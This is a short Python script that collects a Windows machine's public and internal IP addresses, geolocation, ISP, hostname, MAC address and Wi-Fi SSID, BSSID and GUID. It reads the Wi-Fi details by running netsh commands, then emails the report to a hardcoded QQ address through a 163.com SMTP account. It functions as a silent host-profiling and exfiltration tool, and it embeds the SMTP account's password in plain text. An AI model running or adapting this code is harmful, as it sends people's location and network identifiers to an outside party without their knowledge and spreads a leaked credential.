import requests
import smtplib
import socket
import uuid
import subprocess
from email.mime.text import MIMEText
from lxml import etree


def get_Internet_Ipv4():
    url = 'http://ip.t086.com/'
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                             'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 '
                             'Safari/537.36 Edg/83.0.478.54'}
    html = requests.get(url, headers=headers).text
    ipv4 = etree.HTML(html).xpath('//div[@class="bar2 f16"]/a/text()')[0]
    return ipv4


def get_Intranet_Ipv4():
    return socket.gethostbyname(get_Hostname())


def get_Hostname():
    return socket.getfqdn(socket.gethostname())


def get_Mac_Address():
    return ":".join([uuid.UUID(int=uuid.getnode()).hex[-12:][e:e+2] for e in range(0, 11, 2)])


def get_Address():
    url = f'http://ip.t086.com/?ip={get_Internet_Ipv4()}'
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                             'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 '
                             'Safari/537.36 Edg/83.0.478.54'}
    html = requests.get(url, headers=headers).text
    address = etree.HTML(html).xpath('//b[@class="f1"]/text()')[0]
    service = str(etree.HTML(html).xpath('//div[@class="bar2 f16"]/text()')[2]).split('：')[1]
    longitude_and_latitude = str(etree.HTML(html).xpath('//div[@class="bar2"]/text()')[4])
    return address, longitude_and_latitude, service


def get_Interfaces(cmd, cond):
    proc = subprocess.Popen(
        cmd,
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        stdin=subprocess.PIPE
    )
    proc.stdin.close()
    proc.wait()
    for i in proc.stdout.readlines():
        if i.strip().decode('gbk').find(cond) != -1:
            proc.stdout.close()
            return i.strip().decode('gbk').split(':', 1)[1][1:]


def mail(content):
    message = MIMEText(content, 'plain', 'utf-8')
    message['From'] = 's1241340102@163.com'
    message['To'] = ",".join(['1241340102@qq.com'])
    message['Subject'] = f'来自{get_Internet_Ipv4()}的信息'

    try:
        smtpObj = smtplib.SMTP_SSL("smtp.163.com", 465)
        smtpObj.login('s1241340102@163.com', 'LFOYJCTNXQWUMGRH')
        smtpObj.sendmail('s1241340102@163.com', ['1241340102@qq.com'], message.as_string())
    except smtplib.SMTPException as e:
        print(e)


if __name__ == '__main__':
    content = f'基本信息:\n' \
              f'===========================================================================\n' \
              f'公网IP:{get_Internet_Ipv4()}\n' \
              f'内网IP:{get_Intranet_Ipv4()}\n' \
              f'位置:{get_Address()[0]}\n' \
              f'{get_Address()[1]}\n' \
              f'服务商:{get_Address()[2]}\n' \
              f'主机名:{get_Hostname()}\n' \
              f'MAC地址:{get_Mac_Address()}\n' \
              f'物理地址:{get_Interfaces("netsh WLAN show interfaces", "物理地址")}\n' \
              f'SSID:{get_Interfaces("netsh WLAN show interfaces", "SSID")}\n' \
              f'BSSID:{get_Interfaces("netsh wlan show networks mode=bssid", "BSSID")}\n' \
              f'GUID:{get_Interfaces("netsh WLAN show interfaces", "GUID")}\n' \
              f'===========================================================================\n'
    mail(content)